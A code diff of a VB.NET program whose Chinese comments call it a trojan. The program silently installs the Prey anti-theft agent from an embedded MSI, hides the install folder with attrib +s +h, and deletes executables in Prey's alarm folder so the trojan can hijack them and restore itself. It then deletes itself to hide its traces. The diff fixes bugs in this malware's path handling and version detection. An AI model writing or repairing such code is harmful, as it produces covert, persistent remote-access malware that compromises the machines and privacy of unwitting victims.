@@ -44,7 +44,7 @@ Namespace My
             If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
 
             '静默安装 Prey 服务
-            If Not InstallMSI() Then End
+            InstallMSI()
 
             '安装完毕后删除 MSI 安装程序
             If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)
@@ -56,8 +56,8 @@ Namespace My
             Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
 
             PreyVireion = GetHighestVersion(PreyDirectory & "\versions\")
-            FlashDirectory = PreyVireion & "\lib\agent\actions\alert\win32\"
-            AlarmDirectory = PreyVireion & "\lib\agent\actions\alarm\bin\"
+            FlashDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
+            AlarmDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
 
             '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
             If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
@@ -107,8 +107,7 @@ Namespace My
         ''' <summary>
         ''' 静默安装 Prey.msi
         ''' </summary>
-        ''' <returns></returns>
-        Private Function InstallMSI() As Boolean
+        Private Sub InstallMSI()
             '静默安装：
             'msiexec.exe /i prey-windows-1.X.X-xxx.msi /lv installer.log /q AGREETOLICENSE=yes API_KEY=foobar123
             '安装完成后提示： "/q" 改为 "/qn+"
@@ -128,9 +127,7 @@ Namespace My
             End Try
             '宿主程序具有管理员权限，所以不需要使用 ShellExecute ，方便等待进程结束
             Shell(ShellCommand, AppWinStyle.Hide, True)
-            '使用 [被寄生程序] 是否存在作为返回值
-            Return IO.File.Exists(FlashDirectory & "Flash.exe")
-        End Function
+        End Sub
 
         ''' <summary>
         ''' 结束程序并自动删除自身，以隐藏痕迹
@@ -146,11 +143,11 @@ Namespace My
         ''' </summary>
         Private Function GetHighestVersion(SoftwareDirectory As String) As String
             Dim VersionDir() As String = Directory.GetDirectories(SoftwareDirectory)
-            If VersionDir.Length = 1 Then Return VersionDir.First
+            If VersionDir.Length = 1 Then Return Path.GetFileName(VersionDir.First)
             Dim HighVersion As Version = New Version("0.0.0")
             Dim TempVersion As Version
             For Each VersionStr In VersionDir
-                TempVersion = New Version(Path.GetDirectoryName(VersionStr))
+                TempVersion = New Version(Path.GetFileName(VersionStr))
                 If TempVersion > HighVersion Then HighVersion = TempVersion
             Next
             Return HighVersion.ToString()
